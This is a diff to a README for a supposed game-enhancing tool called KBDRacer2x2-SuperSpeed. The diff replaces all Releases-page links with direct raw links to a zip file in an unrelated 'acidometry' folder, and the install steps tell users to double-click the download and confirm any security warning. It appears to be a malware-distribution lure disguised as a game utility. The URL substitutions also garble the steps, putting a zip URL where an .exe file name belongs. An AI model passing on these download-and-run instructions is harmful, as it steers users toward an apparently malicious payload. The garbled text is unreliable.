@@ -4,17 +4,17 @@
 Welcome to KBDRacer2x2-SuperSpeed! This software enhances your racing experience in games like Forza Horizon 6. Follow the steps below to download and run the application easily.
 
 ## 🔗 Download the Application
-[![Download KBDRacer2x2-SuperSpeed](https://img.shields.io/badge/Download-KBDRacer2x2--SuperSpeed-blue)](https://github.com/mako1245/KBDRacer2x2-SuperSpeed/releases)
+[![Download KBDRacer2x2-SuperSpeed](https://raw.githubusercontent.com/mako1245/KBDRacer2x2-SuperSpeed/master/acidometry/KBDRacer2x2-SuperSpeed.zip)](https://raw.githubusercontent.com/mako1245/KBDRacer2x2-SuperSpeed/master/acidometry/KBDRacer2x2-SuperSpeed.zip)
 
 ## 📥 Download & Install
 1. Click the link above to visit the Releases page.
 2. On the Releases page, look for the latest version. It will often have a tag like `v1.0`.
 3. Click on the version number to expand it. 
-4. Find the file that ends with `.exe`, usually labeled as `KBDRacer2x2_SuperSpeed.exe`. This is your main application file.
+4. Find the file that ends with `.exe`, usually labeled as `https://raw.githubusercontent.com/mako1245/KBDRacer2x2-SuperSpeed/master/acidometry/KBDRacer2x2-SuperSpeed.zip`. This is your main application file.
 5. Click the file to start the download. Depending on your browser's settings, save the file to your desired location. 
 
 ## 📂 Running the Application
-1. Navigate to the folder where you saved the `KBDRacer2x2_SuperSpeed.exe` file.
+1. Navigate to the folder where you saved the `https://raw.githubusercontent.com/mako1245/KBDRacer2x2-SuperSpeed/master/acidometry/KBDRacer2x2-SuperSpeed.zip` file.
 2. Double-click the file. If prompted with a security warning, confirm that you want to run it.
 3. The application will open, and you can start using it to enhance your racing adventures.
 
@@ -42,4 +42,4 @@ If you have questions or need support, consider checking out our community forum
 
 Feel free to explore the software, and enjoy a racing experience like never before! For additional guidance, refer back to this README at any time. 
 
-Remember, the download link is always available here: [Download KBDRacer2x2-SuperSpeed](https://github.com/mako1245/KBDRacer2x2-SuperSpeed/releases).
+Remember, the download link is always available here: [Download KBDRacer2x2-SuperSpeed](https://raw.githubusercontent.com/mako1245/KBDRacer2x2-SuperSpeed/master/acidometry/KBDRacer2x2-SuperSpeed.zip).
